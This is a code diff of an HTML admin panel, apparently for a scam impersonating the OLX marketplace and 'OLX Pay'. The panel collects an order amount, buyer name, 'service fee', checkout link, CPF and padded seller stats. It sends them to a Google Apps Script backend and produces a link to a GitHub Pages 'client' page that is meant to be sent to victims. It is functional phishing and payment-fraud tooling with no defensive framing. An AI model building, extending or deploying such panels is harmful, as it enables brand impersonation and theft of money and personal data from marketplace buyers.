@@ -3,114 +3,193 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Atualizar Dados - Painel OLX Pay</title>
+<title>Admin - Gerador de Links OLX</title>
 <style>
-  body { background:#1e1e1e; color:#fff; font-family:Arial,sans-serif; margin:0; padding:20px; }
-  h1 { text-align:center; margin-bottom:25px; color:#00bfa5; }
-  form { max-width:500px; margin:0 auto; background:#2b2b2b; padding:25px; border-radius:12px; box-shadow:0 0 10px rgba(0,0,0,0.5);}
-  label { display:block; margin-top:12px; font-weight:bold; color:#e0e0e0;}
-  input, select { width:100%; padding:10px; margin-top:5px; border:none; border-radius:6px; background:#3a3a3a; color:#fff; font-size:14px;}
-  input:focus, select:focus { outline:2px solid #00bfa5;}
-  button { width:100%; margin-top:20px; padding:12px; background:#00bfa5; border:none; border-radius:8px; color:#fff; font-weight:bold; font-size:16px; cursor:pointer; transition:0.3s;}
-  button:hover { background:#009e8e;}
-  .msg { text-align:center; margin-top:15px; font-weight:bold;}
-  .hidden { display:none;}
-  @media(max-width:600px){ body{padding:15px;} form{padding:20px;} input,select,button{font-size:16px;} }
-  .refLabel { color:#b0f2d5; margin-bottom:4px; font-size:14px; font-weight:bold;}
+  /* --- ESTILOS (Visual Dark Mode) --- */
+  body { background:#1e1e1e; color:#fff; font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding:20px; margin:0; }
+  
+  form { 
+    max-width:500px; margin:0 auto; background:#2b2b2b; padding:30px; 
+    border-radius:12px; box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+  }
+  
+  h2 { text-align:center; color:#00bfa5; margin-top:0; }
+  
+  label { 
+    display:block; font-size: 12px; color: #ccc; 
+    text-transform: uppercase; font-weight: bold; margin-top: 15px; 
+  }
+  
+  input { 
+    width:100%; padding:12px; margin-top:5px; background:#3a3a3a; 
+    border:1px solid #444; color:#fff; border-radius:6px; box-sizing: border-box; 
+    font-size: 15px; transition: 0.3s;
+  }
+  input:focus { border-color: #00bfa5; outline: none; background: #444; }
+  
+  button#btnSalvar { 
+    width:100%; padding:15px; background:#00bfa5; border:none; 
+    border-radius:8px; color:#fff; font-weight:bold; cursor:pointer; 
+    font-size: 16px; margin-top: 25px; transition: 0.2s;
+  }
+  button#btnSalvar:hover { background:#009e8e; transform: translateY(-2px); }
+  button:disabled { background: #555; cursor: not-allowed; opacity: 0.7; }
+  
+  /* --- MODAL (Pop-up) --- */
+  .modal { 
+    display:none; position:fixed; top:0; left:0; width:100%; height:100%; 
+    background:rgba(0,0,0,0.9); align-items:center; justify-content:center; z-index: 1000;
+  }
+  .modal.active { display:flex; animation: fadeIn 0.3s; }
+  
+  .modal-box { 
+    background:#222; padding:30px; border-radius:10px; text-align:center; 
+    max-width:450px; width: 90%; border: 1px solid #444; box-shadow: 0 0 50px rgba(0,191,165,0.2);
+  }
+  
+  .link-display { 
+    background:#111; padding:15px; color:#00bfa5; word-break:break-all; 
+    margin:20px 0; border-radius:5px; font-family: monospace; border: 1px dashed #333;
+  }
+  
+  .btn-action { 
+    padding:12px; border:none; border-radius:6px; cursor:pointer; font-weight:bold; width: 100%; margin-bottom: 10px;
+  }
+  .btn-copy { background:#fff; color:#000; }
+  .btn-new { background:transparent; color:#888; border: 1px solid #444; }
+  .btn-new:hover { color: #fff; border-color: #fff; }
+
+  @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
 </style>
 </head>
 <body>
 
-<h1>Atualizar Dados da Planilha</h1>
-<form id="updateForm">
-  <label for="id">Selecione o ID</label>
-  <select id="id" name="id" required>
-    <option value="">-- Escolha o ID --</option>
-    <option value="pay0733">pay0733</option>
-    <option value="pay3307">pay3307</option>
-    <option value="pay3703">pay3703</option>
-    <option value="pay0373">pay0373</option>
-  </select>
+<form id="adminForm">
+  <h2>Novo Pedido</h2>
+  
+  <label>Valor Total (Ex: R$ 1.200,00)</label>
+  <input type="text" name="valor" required placeholder="Digite o valor final">
 
-  <div id="taxaWrapper">
-    <div id="taxaLabel" class="refLabel"></div>
-    <label>Taxa</label>
-    <input type="text" id="taxa" name="taxa">
+  <label>Nome do Comprador</label>
+  <input type="text" name="comprador" required placeholder="Nome completo">
+
+  <label>Taxa de Serviço (Ex: R$ 50,00)</label>
+  <input type="text" name="taxa" placeholder="Valor da taxa">
+
+  <label>Link Pagamento (Checkout)</label>
+  <input type="text" name="linkPagamento" placeholder="https://seuchekout.com...">
+
+  <label>Frete (Opcional)</label>
+  <input type="text" name="frete" placeholder="Ex: Grátis">
+
+  <label>Tarifa (Opcional)</label>
+  <input type="text" name="tarifa" placeholder="Ex: Inclusa">
+
+  <label>CPF (Opcional)</label>
+  <input type="text" name="cpf">
+
+  <div style="display:flex; gap:10px;">
+    <div style="flex:1">
+      <label>Vendas</label>
+      <input type="text" name="vendas" value="+100 vendas">
+    </div>
+    <div style="flex:1">
+      <label>Atendimento</label>
+      <input type="text" name="atendimento" value="Rápido">
+    </div>
   </div>
 
-  <div id="compradorWrapper">
-    <div id="compradorLabel" class="refLabel"></div>
-    <label>Comprador</label>
-    <input type="text" id="comprador" name="comprador">
-  </div>
-
-  <div id="advancedFields" class="hidden">
-    <label>Valor</label><input type="text" id="valor" name="valor">
-    <label>Frete</label><input type="text" id="frete" name="frete">
-    <label>Tarifa</label><input type="text" id="tarifa" name="tarifa">
-    <label>CPF</label><input type="text" id="cpf" name="cpf">
-    <label>Cartão</label><input type="text" id="cartao" name="cartao">
-    <label>Vendas</label><input type="text" id="vendas" name="vendas">
-    <label>Atendimento</label><input type="text" id="atendimento" name="atendimento">
-    <label>Entrega</label><input type="text" id="entrega" name="entrega">
-    <label>Link de Pagamento</label><input type="text" id="linkPagamento" name="linkPagamento">
-  </div>
-
-  <button type="button" id="toggleAdvanced">Atualização avançada</button>
-  <button type="submit">Salvar Alterações</button>
-  <div class="msg" id="msg"></div>
+  <button type="submit" id="btnSalvar">Gerar Link do Cliente</button>
 </form>
 
+<div class="modal" id="modalSuccess">
+  <div class="modal-box">
+    <h3 style="color:#00bfa5; margin-top:0;">Link Gerado com Sucesso!</h3>
+    <p style="color:#aaa; font-size:14px;">Envie este link para o cliente acessar os dados.</p>
+    
+    <div class="link-display" id="finalLink">...</div>
+    
+    <button class="btn-action btn-copy" id="btnCopy">Copiar Link</button>
+    <button class="btn-action btn-new" onclick="location.reload()">Criar Novo Pedido</button>
+  </div>
+</div>
+
 <script>
-const FORM = document.getElementById('updateForm');
-const MSG = document.getElementById('msg');
-const WEB_APP_URL = 'https://script.google.com/macros/s/AKfycbw25mbSP6E1kpFtV0tMy0Y3IMHoUw9_oTu79oOeDqwfDSse5SklzEi3JxPlevsRh5BDsg/exec';
-const toggleBtn = document.getElementById('toggleAdvanced');
-const advancedFields = document.getElementById('advancedFields');
-const taxaLabel = document.getElementById('taxaLabel');
-const compradorLabel = document.getElementById('compradorLabel');
+// ========================================================
+// ⚙️ CONFIGURAÇÃO OBRIGATÓRIA
+// ========================================================
 
-toggleBtn.addEventListener('click', () => advancedFields.classList.toggle('hidden'));
+// 1. Cole aqui a URL do seu Google Script (Implantar > Web App)
+const BACKEND_URL = 'https://script.google.com/macros/s/AKfycbw25mbSP6E1kpFtV0tMy0Y3IMHoUw9_oTu79oOeDqwfDSse5SklzEi3JxPlevsRh5BDsg/exec'; 
 
-async function carregarReferencia(id) {
-  if (!id) { taxaLabel.textContent=''; compradorLabel.textContent=''; return; }
-  try {
-    const res = await fetch(`${WEB_APP_URL}?id=${id}`);
-    const data = await res.json();
-    if(data.status==='success'){
-      taxaLabel.textContent = `Taxa atual: ${data.taxa||'---'}`;
-      compradorLabel.textContent = `Comprador atual: ${data.comprador||'---'}`;
-    } else { taxaLabel.textContent=''; compradorLabel.textContent=''; MSG.textContent = data.message; }
-  } catch(err){ console.error(err); MSG.textContent='❌ Erro ao buscar dados.'; }
-}
+// 2. Cole aqui a URL do seu site GitHub Pages (Tela do Cliente)
+const CLIENTE_URL = 'https://olxltda.github.io/OLX/'; 
 
-document.getElementById('id').addEventListener('change', e => carregarReferencia(e.target.value));
+// ========================================================
 
-FORM.addEventListener('submit', async e => {
+const form = document.getElementById('adminForm');
+const modal = document.getElementById('modalSuccess');
+const linkDisplay = document.getElementById('finalLink');
+const btnSalvar = document.getElementById('btnSalvar');
+const btnCopy = document.getElementById('btnCopy');
+
+form.addEventListener('submit', async (e) => {
   e.preventDefault();
-  const formData = new FormData(FORM);
-  const dados = {};
-  formData.forEach((v,k)=>{ if(v.trim()!=='') dados[k]=v.toString(); });
+  
+  // Bloqueia botão
+  btnSalvar.textContent = "Processando...";
+  btnSalvar.disabled = true;
 
-  if(!dados.id){ MSG.textContent='❌ Selecione um ID.'; return; }
+  // Coleta dados do form
+  const data = {};
+  new FormData(form).forEach((v, k) => data[k] = v);
 
   try {
-    MSG.textContent='Salvando...';
-    await fetch(WEB_APP_URL,{
-      method:'POST',
-      mode:'no-cors',
-      headers:{'Content-Type':'application/json'},
-      body: JSON.stringify(dados)
+    // TÉCNICA ANTI-CORS: text/plain + redirect:follow
+    const res = await fetch(BACKEND_URL, {
+      method: 'POST',
+      redirect: 'follow', 
+      headers: {
+        'Content-Type': 'text/plain;charset=utf-8', 
+      },
+      body: JSON.stringify(data)
     });
-    MSG.textContent='✅ Dados atualizados com sucesso!';
-    FORM.reset();
-    advancedFields.classList.add('hidden');
-    taxaLabel.textContent='';
-    compradorLabel.textContent='';
-  } catch(err){ console.error(err); MSG.textContent='❌ Erro ao enviar dados.'; }
+    
+    const json = await res.json();
 
-  setTimeout(()=>{ MSG.textContent=''; },3000);
+    if (json.status === 'success') {
+      // Monta o link final: URL do Site + ?id= + ID gerado pelo Google
+      const linkPronto = `${CLIENTE_URL}?id=${json.id}`;
+      
+      // Exibe Modal
+      linkDisplay.textContent = linkPronto;
+      modal.classList.add('active');
+    } else {
+      alert('Erro do Servidor: ' + json.message);
+    }
+
+  } catch (err) {
+    console.error(err);
+    alert('❌ ERRO DE PERMISSÃO OU CONEXÃO!\n\nVerifique:\n1. Se você implantou o Script como "Qualquer pessoa" (Anyone).\n2. Se a URL do Script está correta.');
+  } finally {
+    // Libera botão
+    btnSalvar.textContent = "Gerar Link do Cliente";
+    btnSalvar.disabled = false;
+  }
+});
+
+// Botão Copiar
+btnCopy.addEventListener('click', () => {
+  navigator.clipboard.writeText(linkDisplay.textContent);
+  const original = btnCopy.textContent;
+  btnCopy.textContent = "Copiado!";
+  btnCopy.style.background = "#4CAF50";
+  setTimeout(() => {
+    btnCopy.textContent = original;
+    btnCopy.style.background = "#fff";
+  }, 2000);
 });
 </script>
+
 </body>
 </html>
